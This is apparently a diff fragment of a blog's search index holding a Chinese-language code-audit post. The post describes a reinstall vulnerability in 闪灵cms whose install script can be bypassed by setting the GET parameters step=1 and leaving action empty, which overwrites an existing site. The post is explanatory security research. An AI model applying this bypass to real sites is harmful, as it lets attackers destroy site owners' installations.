+        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=414826603&auto=1&height=66"></iframe><p>Cms重装漏洞简介：一般cms都有一个install的文件用于安装cms的包括数据库信息，网站信息等但是如果没有对install这个文件做安全的校验就会出现，重装漏洞，即覆盖掉原网站。这里用闪灵cms做简单说明</p><div>    首先，定位到install文件的位置</br><a href="https://sm.ms/image/NCIGpugAaect7nO" target="_blank"><img src="https://i.loli.net/2020/03/27/NCIGpugAaect7nO.png" /></a>   <p> 简单解释下，第1-15行的意思，就是get接受两个参数。如果action参数的值为savepath就会返回一个后台信息和账号密码的文本，并且停止到脚本</br>向下走16行-20行就是 分割路径然后请求/data/config.json文件并且返回其中的id值，然后在去请求官网的api接口    </p>    继续向下走：</br><a href="https://sm.ms/image/w8OT9M4ubE6KSR5" target="_blank"><img src="https://i.loli.net/2020/03/27/w8OT9M4ubE6KSR5.png" /></a></br>    判断step的值 如果不是4 并且step为，就会跳转回首页</br><p><a href="https://sm.ms/image/fA3p4r9QZlkuOG7" target="_blank"><img src="https://i.loli.net/2020/03/27/fA3p4r9QZlkuOG7.png" /></a><br>    判断step的值 如果为1或者空则进入到安装页面。<br></br><br><a href="https://sm.ms/image/m1dynSiusqpIzJV" target="_blank"><img src="https://i.loli.net/2020/03/27/m1dynSiusqpIzJV.png" /></a><br>也是判断step的值为2时候进入此页面，（3 和 4 步骤同，就不贴了）</br></p><p>至此，我们可以看到他的整体一个流程，首先get类型接收step和action的值如果action=savepath 就会停止脚本的运行，如果step为空 或者0 就会跳转回首页所以我们可以直接step=1 action=null，直接绕过限制 ，从而造成重装漏洞 </p><p><a href="https://sm.ms/image/zsv2mliyXNaIBJp" target="_blank"><img src="https://i.loli.net/2020/03/27/zsv2mliyXNaIBJp.png" /></a></p></div>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
